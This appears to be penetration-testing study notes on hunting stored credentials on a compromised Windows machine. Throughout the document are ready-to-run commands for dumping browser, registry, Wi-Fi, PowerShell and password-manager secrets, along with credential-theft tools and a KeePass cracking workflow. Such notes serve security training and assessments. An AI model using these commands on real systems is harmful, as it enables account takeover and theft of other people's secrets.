### Content

- [Files of Interest](#files-of-interest)
	- [Files Content](#files-content)
	- [Files Names](#files-names)
	- [File Extensions](#file-extensions)
- [Dictionary Files](#dictionary-files)
- [PowerShell History File](#powershell-history-file)
- [PowerShell Credentials](#powershell-credentials)
- [Cmdkey Saved Credentials](#cmdkey-saved-credentials)
- [Browser Credentials](#browser-credentials)
- [Password Managers](#password-managers)
- [Lazagne](#lazagne)
- [Snaffler](#snaffler)
- [SessionGopher](#sessiongopher)
- [Passwords in Registry](#passwords-in-registry)
	- [Windows AutoLogon](#windows-autologon)
	- [Putty](#putty)
- [WIFI Passwords](#wifi-passwords)

---
### Files of Interest

Some local files of interest may include:

```TXT
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security

%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%WINDIR%\System32\drivers\etc\hosts

c:\inetpub\wwwwroot\web.config

%SYSTEMDRIVE%\pagefile.sys

%WINDIR%\debug\NetSetup.log
%WINDIR%\iis6.log

%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat

C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

We may also come across `.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.

Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the `unattend.xml` are stored in plaintext or base64 encoded.
These files should be automatically deleted as part of installation, but sysadmins may create copies of it.

Once we have access to a target, we can hunt stored credentials stored on it.
- Key Terms to Search: Passwords, Passphrases, Keys, Username, User account, Creds, Users, Passkeys, Passphrases, configuration, dbcredential, dbpassword, pwd, Login, Credentials.

#### Files Content

``` Powershell
# CMD:
findstr /SIM "password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
findstr /spinm "password" *.* 
# remove the M to print the line with matched string

# PowerShell:
select-string -Path C:\Users\*.txt -Pattern password
```

#### Files Names

```PowerShell
findstr /SI "password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

#### File Extensions

```PowerShell
# CMD:
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ *.config

# PowerShell:
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

#### Sticky Notes Passwords

When every you save passwords and secrets in StickyNotes on Windows you might think it's a regular file, but it's a database file and it's location 
`C:\Users\<User>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`

We can copy the three `plum.sqlite*` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query `select Text from Note;`.

and we can use `strings` command to search through the data.

```bash
$ strings plum.sqlite-wal
```

Or do it with PowerShell using the [PSSQLite module](https://github.com/RamblingCookieMonster/PSSQLite).

```PowerShell
C:\> Set-ExecutionPolicy Bypass -Scope Process
C:\> Import-Module .\PSSQLite.psd1
C:\> $db = 'C:\Users\<User>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
 
```

---
### Dictionary Files

sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The user may add these words to their dictionary to avoid the distracting red underline.

For example: Google chrome dictionary file:

```PowerSHell
PS C:\> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

Password1234!
```

---
### PowerShell History File

Starting with PowerShell 5.0 in Windows 10, PowerShell stores command history to the file:
`C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

For Confirming PowerShell History Save Path: 

```PowerShell
PS C:\user> (Get-PSReadLineOption).HistorySavePath

C:\Users\user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Reading the file content

```PowerShell
PS C:\user> gc (Get-PSReadLineOption).HistorySavePath

dir
cd Temp
md backups
cp c:\inetpub\wwwroot\* .\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))
. .\Get-IISsite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02
```

If we have administrator access over a machine, we should enumerate this file in every user profile:

```PowerShell
PS C:\> foreach($user in ((ls C:\users).fullname)){{echo "`n`n`n$user`n`n`n`n"; cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

dir
cd Temp
md backups
cp c:\inetpub\wwwroot\* .\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))
. .\Get-IISsite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02
```

---
### PowerShell Credentials

PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API), which typically means they can only be decrypted by the same user on the same computer they were created on.

The following script `Connect-VC.ps1`, which a sysadmin has created to connect to a vCenter server easily.

```PowerShell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from `encrypted.xml`. The example below assumes the former.

```PowerShell
PS C:\> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

bob
PS C:\> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```

---
### Cmdkey Saved Credentials

```PowerShell
C:\> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: corp\bob
```

- When we attempt to RDP with the RDP client on windows to the host `sql01`, the saved credentials will be used.

Run Commands as Another User with `runas`

```PowerShell
PS C:\> runas /savecred /user:corp\bob "COMMAND HERE"
```

---
### Browser Credentials

We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.

```PowerShell
PS C:\> .\SharpChrome.exe logins /unprotect
```

> Credential collection from Chromium-based browsers generates events that could be logged and identified as `4983`, `4688`, and `16385`, and monitored by the blue team.

---
### Password Managers

There are many password managers. (KeePass, 1Password, Thycotic, CyberArk, KeePassXC....)

KeePass using files with `kdbx` extension, transfer it to the Linux attack host.

```bash
$keepass2john.py CORP_Help_Desk.kdbx 

CORP_Help_Desk:$keepass$*2*60000*222*f49632ef******

$ hashcat -m 13400 keepass_hash rockyou.txt
```

Also KeePassXC is an open source password manager, which can be cracked with [keepass4brute](https://github.com/r3nt0n/keepass4brute)

```bash
$ ./keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt
[*] Password found: liverpool
```

---
### Lazagne

 [Lazagne](https://github.com/AlessandroZ/LaZagne/releases/)
  
``` CMD
C:\> start lazagne.exe all
```

- Other places we should keep in mind when credential hunting:
	- Group Policy and scripts in the SYSVOL share.
	- Look at IT shares.
	- Passwords in the AD user or computer description fields.

---
### Snaffler

[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment.
works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.
Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment.
``` Powershell
PS C:\Users> Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

---
### SessionGopher

We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved `PuTTY`, `WinSCP`, `FileZilla`, `SuperPuTTY`, and `RDP` credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools. It can be run locally or remotely.

```PowerShell
PS C:\> Import-Module .\SessionGopher.ps1
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
```

---
### Passwords in Registry

Certain programs and windows configurations can result in clear-text passwords or other data being stored in the registry.
##### Windows AutoLogon

Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) is a feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, without requiring manual input of the username and password at each startup.

Once this is configured, the username and password are stored in the registry, in clear-text.

```PowerShell
C:\> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    <SNIP>
    
    AutoAdminLogon     REG_SZ    1         # 1 means it's enabled
    DefaultUserName    REG_SZ    User
    DefaultPassword    REG_SZ    Password
```

> It is recommended to use Autologon.exe from the Sysinternals suite, which will encrypt the password as an LSA secret.

##### Putty

For Putty sessions utilizing a proxy connection, when the session is saved, the credentials are stored in the registry in clear text.

The access controls for this specific registry key are tied to the user account that configured and saved the session.

We need to be logged in as that user and search the `HKEY_CURRENT_USER` hive.
If admin privileges is available, find it under the corresponding user's hive in `HKEY_USERS`.

```PowerShell
C:\> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

PS C:\> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

  <SNIP>
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_4dm1n!
```

---
### WIFI Passwords

View all access point saved networks

```CMD
C:\> netsh wlan show profile

<SNIP>
User profiles
-------------
    All User Profile     : network0
    All User Profile     : network1
    All User Profile     : network2
```

Retrieving saved network password

```CMD
C:\> netsh wlan show profile <SSID> key=clear
```

One liner method to extract WIFI passwords from all the access point.

```CMD
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```
